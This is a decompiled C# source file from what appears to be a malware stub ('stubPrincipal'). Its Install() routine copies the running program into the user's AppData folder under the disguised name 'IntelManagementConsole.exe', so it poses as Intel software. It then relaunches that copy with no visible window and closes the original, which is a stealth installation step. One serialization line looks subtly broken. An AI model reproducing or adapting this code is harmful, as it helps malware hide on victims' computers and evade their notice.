using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My;

namespace stubPrincipal
{
	// Token: 0x0200000D RID: 13
	[StandardModule]
	public sealed class agua
	{
		// Token: 0x060008F1 RID: 2289 RVA: 0x0002A428 File Offset: 0x00028628
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void Install()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IntelManagementConsole\\IntelManagementConsole.exe";
			byte[] bytes;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				new BinaryFormatter().Serialize(memoryStream, Assembly.GetExecutingAssembly());
				bytes = memoryStream.ToArray();
			}
			File.WriteAllBytes(text, bytes);
			if (Operators.CompareString(Application.ExecutablePath, text, false) != 0)
			{
				MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, text, true);
				using (Process process = new Process())
				{
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.FileName = text;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				Process.GetCurrentProcess().CloseMainWindow();
				MyProject.Forms.FormularioDoCrime.Close();
				MyProject.Forms.FormulaMagicaDaPaz.Close();
				MyProject.Forms.MainForm.Close();
				Application.Exit();
				Process.GetCurrentProcess().Close();
				FileSystem.FileClose(new int[0]);
				ProjectData.EndApp();
			}
		}

		// Token: 0x060008F2 RID: 2290 RVA: 0x0002A550 File Offset: 0x00028750
		public static void MeusOvos()
		{
			MyProject.Forms.Ingratek.Show();
		}
	}
}
